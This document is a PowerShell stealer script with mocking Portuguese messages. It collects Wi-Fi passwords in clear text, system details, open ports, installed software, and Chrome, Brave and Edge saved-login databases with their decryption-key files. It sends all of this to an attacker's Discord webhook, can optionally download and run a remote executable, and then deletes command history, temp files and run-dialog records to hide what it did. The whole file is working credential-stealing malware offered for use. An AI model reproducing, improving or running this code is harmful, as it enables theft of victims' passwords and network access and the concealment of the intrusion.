<# Visual #>
$Host.UI.RawUI.WindowTitle = "💀💻 | GET REKT BOZO"
$softwareVer = "1.2"
Write-Output "
 ________  ________  ___       ________  ___  ___  ___  ________           ________  ________  ________  ___  __       
|\   ___ \|\   __  \|\  \     |\   __  \|\  \|\  \|\  \|\   ___  \        |\   ___ \|\   __  \|\   __  \|\  \|\  \     
\ \  \_|\ \ \  \|\  \ \  \    \ \  \|\  \ \  \\\  \ \  \ \  \\ \  \       \ \  \_|\ \ \  \|\  \ \  \|\  \ \  \/  /|_   
 \ \  \ \\ \ \  \\\  \ \  \    \ \   ____\ \   __  \ \  \ \  \\ \  \       \ \  \ \\ \ \   __  \ \   _  _\ \   ___  \  
  \ \  \_\\ \ \  \\\  \ \  \____\ \  \___|\ \  \ \  \ \  \ \  \\ \  \       \ \  \_\\ \ \  \ \  \ \  \\  \\ \  \\ \  \ 
   \ \_______\ \_______\ \_______\ \__\    \ \__\ \__\ \__\ \__\\ \__\       \ \_______\ \__\ \__\ \__\\ _\\ \__\\ \__\
    \|_______|\|_______|\|_______|\|__|     \|__|\|__|\|__|\|__| \|__|        \|_______|\|__|\|__|\|__|\|__|\|__| \|__|
                                                                                                                       
                                                                                                                       
                                         Dolphin Dark lhe deu a verdade. Faça o que quiser.
  
⠀⠀⠀ TROLLING SERVICES INCORPORATED 
⠀   lololololil
"
<# Features #>
$features = @{
    "gatherPcData" = $true
    "gatherWifiProfiles" = $true
    "gatherOpenPorts" = $true
    "executeExe" = $false
    "gatherBrowserPass" = $true
    "gatherInstalledSoftware" = $true
    "removeTraces" = $true
}
foreach ($feature in $features.Keys) { if (-not (Test-Path "variable:$feature")) { Set-Variable -Name $feature -Value $features[$feature] } }

<# Extras #>
if ([string]::IsNullOrEmpty($keyContentLabel)) { $keyContentLabel = "Conteúdo da Chave|Key Content" }
param ($hookUrl)

if ($executeExe -and [string]::IsNullOrEmpty($exeUrl)) { Write-Output "You need to define a URL for your executable."; exit }
$filesToSend = @()

<# Functions #>
function Send-Webhook {
    param (
        [string]$jsonBody,
        [array]$files
    )

    $boundary = "----WebKitFormBoundary" + [System.Guid]::NewGuid().ToString("N")

    $bodyLines = @("--$boundary")

    $bodyLines += @(
        "Content-Disposition: form-data; name=`"payload_json`"",
        "",
        $jsonBody
    )

    if ($files.Count -gt 0) {
        $index = 0
        foreach ($file in $files) {
            $filePath = $file.Path
            $prefix = $file.Prefix
            if (Test-Path $filePath) {
                $fileContent = [System.IO.File]::ReadAllBytes($filePath)
                $fileName = [System.IO.Path]::GetFileName($filePath)
                $bodyLines += @(
                    "--$boundary",
                    "Content-Disposition: form-data; name=`"file[$index]`"; filename=`"$prefix-$fileName`"",
                    "Content-Type: application/octet-stream",
                    "",
                    [System.Text.Encoding]::Default.GetString($fileContent)
                )
                $index++
            }
        }
    }

    $bodyLines += "--$boundary--"

    $body = [System.String]::Join("`r`n", $bodyLines)

    $headers = @{
        "Content-Type" = "multipart/form-data; boundary=$boundary"
    }

    $null = Invoke-RestMethod -Uri $hookUrl -Method Post -Headers $headers -Body $body
}

<# PC Dump #>
if ($gatherPcData) {
    Write-Output "[ + ] Gathering computer data"
    $specs = Get-ComputerInfo -Property CsManufacturer, CsModel, CsTotalPhysicalMemory, BiosBIOSVersion, CsProcessors
}

<# Wifi Profiles Dump #>
if ($gatherWifiProfiles) {
    Write-Output "[ + ] Gathering wifi profiles"
    $wirelessSSIDs = (netsh wlan show profiles | Select-String ': ' ) -replace ".*:\s+"
    $wifiInfo = foreach($SSID in $wirelessSSIDs) {
        $password = (netsh wlan show profiles name=$SSID key=clear | Select-String $keyContentLabel) -replace ".*:\s+"
        New-Object -TypeName psobject -Property @{"SSID"=$SSID;"Password"=$password}
    }
    if ([string]::IsNullOrEmpty($wifiInfo)) { $wifiInfo= "ERROR: No wireless card detected" }
}

<# Open Ports Dump #>
if ($gatherOpenPorts) {
    Write-Output "[ + ] Gathering open ports"
    $tcpPorts = Get-NetTCPConnection | Where-Object { $_.State -eq 'Listen' } | Select-Object -ExpandProperty LocalPort -Unique
    $udpPorts = Get-NetUDPEndpoint | Select-Object -ExpandProperty LocalPort -Unique
    $openPorts = "TCP: `n$($tcpPorts -join ', ')`n`nUDP: `n$($udpPorts -join ', ')"
}

<# Installed Software #>
if ($gatherInstalledSoftware) {
    Write-Output "[ + ] Gathering installed software"
    $installedSoftware = Get-ChildItem -Path "C:\Program Files" | Select-Object -ExpandProperty Name | Out-String
    if ([string]::IsNullOrEmpty($installedSoftware)) {
        $installedSoftware = "ERROR: No software found or access denied"
    }
}

<# Execute File #>
if ($executeExe) {
    Write-Output "[ + ] Executing EXE"
    $tempFile = "$env:TEMP\UwU.exe"
    Invoke-WebRequest -Uri $exeUrl -OutFile $tempFile
    Start-Process -FilePath $tempFile
}

<# Browser Saved Passwords #>
if ($gatherBrowserPass) {
    Write-Output "[ + ] Gathering saved passwords"
    $browserData = @(
        @{
            ProcessName = "chrome"
            LoginDataPath = "C:\Users\$env:USERNAME\AppData\Local\Google\Chrome\User Data\Default\Login Data"
            LocalStatePath = "C:\Users\$env:USERNAME\AppData\Local\Google\Chrome\User Data\Local State"
            Prefix = "Chrome"
        },
        @{
            ProcessName = "brave"
            LoginDataPath = "C:\Users\$env:USERNAME\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Login Data"
            LocalStatePath = "C:\Users\$env:USERNAME\AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State"
            Prefix = "Brave"
        },
        @{
            ProcessName = "msedge"
            LoginDataPath = "C:\Users\$env:USERNAME\AppData\Local\Microsoft\Edge\User Data\Default\Login Data"
            LocalStatePath = "C:\Users\$env:USERNAME\AppData\Local\Microsoft\Edge\User Data\Local State"
            Prefix = "Edge"
        }
    )

    foreach ($browser in $browserData) {
        if(Get-Process -Name $browser.ProcessName -ErrorAction SilentlyContinue){
            Stop-Process -Name $browser.ProcessName -Force -ErrorAction SilentlyContinue
            Write-Output "[ ! ] Stopping $($browser.ProcessName)"
        }
        if ((Test-Path $browser.LoginDataPath) -and (Test-Path $browser.LocalStatePath)) {
            Write-Output "[ + ] $($browser.Prefix)'s passwords gathered"
            $filesToSend += @{
                Path = $browser.LoginDataPath
                Prefix = $browser.Prefix
            }
            $filesToSend += @{
                Path = $browser.LocalStatePath
                Prefix = $browser.Prefix
            }
        }
    }
}

<# Json Body #>
$json = @{
    embeds = @(
        @{
            title = "Eu fui enganado!"
            color = 0
            fields = @(
                @{
                    name = "Nome da máquina:"
                    value = "``````$($env:COMPUTERNAME)``````"
                    inline = $true
                },
                @{
                    name = "Nome de usuário:"
                    value = "``````$env:USERNAME``````"
                    inline = $true
                },
                @{
                    name = "IP público:"
                    value = "``````$(Invoke-RestMethod -Uri "http://ipinfo.io/ip")``````"
                    inline = $true
                }
            )
            author = @{
                name = "NwaSik SoftWare"
            }
            footer = @{
                text = "Dolphin Dark lhe contou a verdade. Faça o que quiser."
            }
            thumbnail = @{
                url = "https://cdn.discordapp.com/attachments/1227023511185391646/1278089225320796293/1.png?ex=66cf88d9&is=66ce3759&hm=76e04f1e47245ed2bd18ceec8f17821030e231c674e93a78130c0cab8e368e61&"
            }
        }
        if ($gatherPcData) {
            @{
                color = 0
                fields = @(
                    @{
                        name = "Fabricante:"
                        value = "``$($specs.CsManufacturer)``"
                        inline = $true
                    },
                    @{
                        name = "Modelo:"
                        value = "``$($specs.CsModel)``"
                        inline = $true
                    },
                    @{
                        name = "Processadores:"
                        value = "``$($specs.CsProcessors.name)``"
                    },
                    @{
                        name = "Memória Física Total:"
                        value = "``$([math]::round($specs.CsTotalPhysicalMemory / 1GB, 2))GB``"
                        inline = $true
                    },
                    @{
                        name = "Roda Free Fire?:"
                        value = "``Yes``"
                        inline = $true
                    },
                    @{
                        name = "Versão do BIOS:"
                        value = "``$($specs.BiosBIOSVersion)``"
                    }
                )
                author = @{
                    name = "Especificações do PC"
                }
            }
        }
        if ($gatherWifiProfiles) {
            @{
                description = "``````$($wifiInfo | Out-String)``````"
                color = 0
                author = @{
                    name = "Senhas de Wi-Fi"
                }
            }
        }
        if ($gatherOpenPorts) {
            @{
                description = "``````$($openPorts)``````"
                color = 0
                author = @{
                    name = "Portas Abertas"
                }
            }
        }
        if ($gatherInstalledSoftware) {
            @{
                description = "``````$($installedSoftware)``````"
                color = 0
                author = @{
                    name = "Software Instalado"
                }
            }
        }
    )
    username = "$env:USUARIO >:)"
    avatar_url = "https://cdn.discordapp.com/attachments/1227023511185391646/1278089225320796293/1.png?ex=66cf88d9&is=66ce3759&hm=76e04f1e47245ed2bd18ceec8f17821030e231c674e93a78130c0cab8e368e61&"
    attachments = @()
} | ConvertTo-Json -Depth 4

<# Send Webhook #>
Send-Webhook -jsonBody $json -files $filesToSend

<# Remove traces #>
if ($removeTraces) {
    Write-Output "[ - ] Removing traces"
    Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue
    Remove-Item -Path "$env:TEMP\*" -Recurse -Force -ErrorAction SilentlyContinue
    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name * -ErrorAction SilentlyContinue
}

Write-Output "📡 Você foi pego KKKKK >:) HAHA!"
